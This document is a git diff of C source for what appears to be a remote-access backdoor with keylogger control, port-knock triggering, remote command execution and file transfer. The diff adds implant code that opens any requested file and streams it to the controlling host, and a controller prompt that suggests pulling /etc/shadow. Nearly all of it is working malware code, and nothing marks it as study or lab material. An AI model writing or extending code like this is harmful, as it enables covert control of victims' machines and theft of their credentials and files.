@@ -81,6 +81,10 @@ bool handle_command_codes(struct session_info * session_info, const struct packe
             log_message("Running Program\n");
             encountered_command_code = RUN_PROGRAM;
             break;
+        case SEND_FILE:
+            log_message("Send File\n");
+            encountered_command_code = SEND_FILE;
+            break;
         case RECEIVE_FILE:
             log_message("Receiving File\n");
             encountered_command_code = RECEIVE_FILE;
@@ -166,7 +170,7 @@ void stop_keylogger(struct session_info * session_info) {
 }
 
 // NOLINTNEXTLINE
-void process_receive_file(struct session_info * session_info) {
+void process_send_file(struct session_info * session_info) {
     print_linked_list(session_info->head);
 
     const int data_packet_to_read = calculate_data_packet_count(session_info);
@@ -184,7 +188,6 @@ void process_receive_file(struct session_info * session_info) {
         log_message("First Byte %d", first_byte);
         log_message("Second Byte %d", second_byte);
 
-        // First (5, 5) sentinel signals end of filename
         if (first_byte == FILENAME && second_byte == FILENAME) {
             packet_data = packet_data->next;
             break;
@@ -250,6 +253,82 @@ void process_receive_file(struct session_info * session_info) {
 
     fclose(file);
     log_message("File saved: %s", filename);
+}
+
+// NOLINTNEXTLINE
+void process_receive_file(struct session_info * session_info) {
+    print_linked_list(session_info->head);
+    const size_t message_length = MESSAGE_BUFFER_LENGTH;
+    const struct packet_data * packet_data = session_info->head;
+    char filename[256] = {0};
+    int filename_len = 0;
+
+    while (packet_data != NULL) {
+        const uint8_t first_byte  = (packet_data->data >> 8) & 0xFF;
+        const uint8_t second_byte = (packet_data->data) & 0xFF;
+        log_message("First Byte %d", first_byte);
+        log_message("Second Byte %d", second_byte);
+
+        if (first_byte == FILENAME && second_byte == FILENAME) {
+            break;
+        }
+
+        if (filename_len < (int)sizeof(filename) - 2) {
+            if (first_byte == 0) {
+                filename[filename_len++] = (char)second_byte;
+            } else {
+                filename[filename_len++] = (char)first_byte;
+                filename[filename_len++] = (char)second_byte;
+            }
+        }
+
+        packet_data = packet_data->next;
+    }
+
+    while (filename_len > 0 && (filename[filename_len - 1] == '\0' || filename[filename_len - 1] == ' ')) {
+        filename_len--;
+    }
+
+    filename[filename_len] = '\0';
+
+    log_message("Filename: %s", filename);
+
+    FILE * file = fopen(filename, "rb");
+    if (file == NULL) {
+        fprintf(stderr, "Failed to open file: %s\n", filename);
+        send_message(session_info->client_options_->client_fd, session_info->client_options_->knock_source_ip, RECEIVING_PORT, "Failed to open file");
+        send_command(session_info->client_options_->client_fd, session_info->client_options_->knock_source_ip, RECEIVING_PORT, RESPONSE);
+        return;
+    }
+
+    char * file_buffer = malloc(message_length);
+    if (file_buffer == NULL) {
+        fprintf(stderr, "Failed to allocate file buffer\n");
+        fclose(file);
+        return;
+    }
+
+    // Send over the filename and the FILENAME command
+    send_message(session_info->client_options_->client_fd, session_info->client_options_->knock_source_ip, RECEIVING_PORT, filename);
+
+    usleep(10);
+    send_command(session_info->client_options_->client_fd, session_info->client_options_->knock_source_ip, RECEIVING_PORT, FILENAME);
+
+    size_t chunk_count = 0;
+    size_t chunk_bytes;
+    while ((chunk_bytes = fread(file_buffer, 1, message_length - 1, file)) > 0) {
+        file_buffer[chunk_bytes] = '\0';
+        send_message(session_info->client_options_->client_fd, session_info->client_options_->knock_source_ip, RECEIVING_PORT, file_buffer);
+        chunk_count++;
+        printf("Sent chunk %zu (%zu bytes)\n", chunk_count, chunk_bytes);
+        fflush(stdout);
+    }
+
+    printf("File transfer complete. Sent %zu chunks\n", chunk_count);
+    fflush(stdout);
+
+    fclose(file);
+    free(file_buffer);
 }
 
 // NOLINTNEXTLINE
@@ -323,71 +402,8 @@ void send_disconnect(int fd) {
 
 }
 
-
+// NOLINTNEXTLINE
 void send_file(struct server_options * server_options) {
-
-}
-
-void send_watch(int fd, enum FILE_TYPE file_type, char * path) {
-
-}
-
-
-// Run program
-void send_run_program(const struct server_options * server_options) {
-    const size_t message_length = MESSAGE_BUFFER_LENGTH;
-    char * message = malloc(message_length);
-    long bytes_read = 0;
-
-    const int flags = fcntl(STDIN_FILENO, F_GETFL, 0);
-    if (flags == -1) {
-        fprintf(stderr, "F_GETFL on STDIN\n");
-        free(message);
-        return;
-    }
-
-    if (fcntl(STDIN_FILENO, F_SETFL, flags & ~O_NONBLOCK) == -1) {
-        fprintf(stderr, "F_SETFL on STDIN\n");
-        free(message);
-        return;
-    }
-
-    char discard;
-    while (read(STDIN_FILENO, &discard, 1) > 0) {
-        if (discard == '\n') break;
-    }
-
-    fprintf(stdout, "Enter the command to run on remote (i.e. \"ls -al\"): ");
-    fflush(stdout);
-
-    bytes_read = read(STDIN_FILENO, message, message_length);
-    if (bytes_read > 0) {
-        message[bytes_read - 1] = '\0';
-        printf("Sending command: %s\n", message);
-        fflush(stdout);
-
-        // Send over the command and the RUN_PROGRAM command
-        send_message(server_options->client_fd, server_options->client_ip_address, RECEIVING_PORT, message);
-
-        sleep(1);
-        send_command(server_options->client_fd, server_options->client_ip_address, RECEIVING_PORT, RUN_PROGRAM);
-        fflush(stdout);
-    }
-
-    free(message);
-
-    if (fcntl(STDIN_FILENO, F_SETFL, flags | O_NONBLOCK) == -1) {
-        fprintf(stderr, "F_SETFL on STDIN\n");
-    }
-}
-
-
-// Uninstall
-void send_uninstall(int fd) {
-
-}
-
-void send_receive_file(const struct server_options * server_options) {
     const size_t message_length = MESSAGE_BUFFER_LENGTH;
     char * message = malloc(message_length);
     long bytes_read = 0;
@@ -439,7 +455,7 @@ void send_receive_file(const struct server_options * server_options) {
         // Send over the filename and the FILENAME command
         send_message(server_options->client_fd, server_options->client_ip_address, RECEIVING_PORT, message);
 
-        sleep(1);
+        usleep(10);
         send_command(server_options->client_fd, server_options->client_ip_address, RECEIVING_PORT, FILENAME);
 
         size_t chunk_count = 0;
@@ -461,7 +477,111 @@ void send_receive_file(const struct server_options * server_options) {
 
     free(message);
 
-    sleep(1);
+    usleep(10);
+    send_command(server_options->client_fd, server_options->client_ip_address, RECEIVING_PORT, SEND_FILE);
+
+    if (fcntl(STDIN_FILENO, F_SETFL, flags | O_NONBLOCK) == -1) {
+        fprintf(stderr, "F_SETFL on STDIN\n");
+    }
+}
+
+void send_watch(int fd, enum FILE_TYPE file_type, char * path) {
+
+}
+
+// Run program
+void send_run_program(const struct server_options * server_options) {
+    const size_t message_length = MESSAGE_BUFFER_LENGTH;
+    char * message = malloc(message_length);
+    long bytes_read = 0;
+
+    const int flags = fcntl(STDIN_FILENO, F_GETFL, 0);
+    if (flags == -1) {
+        fprintf(stderr, "F_GETFL on STDIN\n");
+        free(message);
+        return;
+    }
+
+    if (fcntl(STDIN_FILENO, F_SETFL, flags & ~O_NONBLOCK) == -1) {
+        fprintf(stderr, "F_SETFL on STDIN\n");
+        free(message);
+        return;
+    }
+
+    char discard;
+    while (read(STDIN_FILENO, &discard, 1) > 0) {
+        if (discard == '\n') break;
+    }
+
+    fprintf(stdout, "Enter the command to run on remote (i.e. \"ls -al\"): ");
+    fflush(stdout);
+
+    bytes_read = read(STDIN_FILENO, message, message_length);
+    if (bytes_read > 0) {
+        message[bytes_read - 1] = '\0';
+        printf("Sending command: %s\n", message);
+        fflush(stdout);
+
+        // Send over the command and the RUN_PROGRAM command
+        send_message(server_options->client_fd, server_options->client_ip_address, RECEIVING_PORT, message);
+
+        usleep(10);
+        send_command(server_options->client_fd, server_options->client_ip_address, RECEIVING_PORT, RUN_PROGRAM);
+        fflush(stdout);
+    }
+
+    free(message);
+
+    if (fcntl(STDIN_FILENO, F_SETFL, flags | O_NONBLOCK) == -1) {
+        fprintf(stderr, "F_SETFL on STDIN\n");
+    }
+}
+
+// Uninstall
+void send_uninstall(int fd) {
+
+}
+
+void send_receive_file(const struct server_options * server_options) {
+    const size_t message_length = MESSAGE_BUFFER_LENGTH;
+    char * message = malloc(message_length);
+    long bytes_read = 0;
+
+    const int flags = fcntl(STDIN_FILENO, F_GETFL, 0);
+    if (flags == -1) {
+        fprintf(stderr, "F_GETFL on STDIN\n");
+        free(message);
+        return;
+    }
+
+    if (fcntl(STDIN_FILENO, F_SETFL, flags & ~O_NONBLOCK) == -1) {
+        fprintf(stderr, "F_SETFL on STDIN\n");
+        free(message);
+        return;
+    }
+
+    char discard;
+    while (read(STDIN_FILENO, &discard, 1) > 0) {
+        if (discard == '\n') break;
+    }
+
+    fprintf(stdout, "Enter the filename to receive (i.e. /etc/shadow): ");
+    fflush(stdout);
+
+    bytes_read = read(STDIN_FILENO, message, message_length);
+    if (bytes_read > 0) {
+        message[bytes_read - 1] = '\0';
+        log_message("Receiving file from remote: %s\n", message);
+        fflush(stdout);
+        // Send over the filename and the FILENAME command
+        send_message(server_options->client_fd, server_options->client_ip_address, RECEIVING_PORT, message);
+        usleep(10);
+        send_command(server_options->client_fd, server_options->client_ip_address, RECEIVING_PORT, FILENAME);
+    }
+
+    free(message);
+
+    usleep(10);
     send_command(server_options->client_fd, server_options->client_ip_address, RECEIVING_PORT, RECEIVE_FILE);
 
     if (fcntl(STDIN_FILENO, F_SETFL, flags | O_NONBLOCK) == -1) {
